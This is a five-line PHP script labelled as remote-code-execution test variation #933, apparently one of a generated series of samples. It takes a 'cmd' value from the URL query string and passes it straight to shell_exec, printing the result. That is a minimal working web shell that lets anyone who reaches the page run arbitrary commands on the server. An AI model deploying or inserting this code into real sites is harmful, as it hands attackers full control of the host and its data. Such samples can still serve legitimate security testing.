<?php
// RCE test variation #933
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>